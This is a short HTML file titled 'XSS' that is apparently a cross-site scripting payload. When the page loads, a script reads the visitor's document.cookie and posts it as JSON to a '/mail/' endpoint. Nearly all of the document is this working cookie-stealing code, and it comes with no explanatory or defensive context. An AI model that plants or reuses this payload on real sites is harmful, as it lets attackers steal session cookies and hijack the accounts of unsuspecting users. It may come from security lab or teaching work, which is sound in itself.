<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8"/>
<title>XSS</title>
</head>
<body>
<h2>Hi!</h2>
<script inline="javascript">
	function getCookies() {
		var http = new XMLHttpRequest();
		http.open("POST", "/mail/", true);
		http.setRequestHeader("Content-Type", "application/json");
		
		var data = {
			content: document.cookie
		};
		
		var load_Json_Data = JSON.stringify(data);
		http.send(load_Json_Data);
}

	window.onload = function () {
		getCookies();	
	}
</script>
</body>
</html>
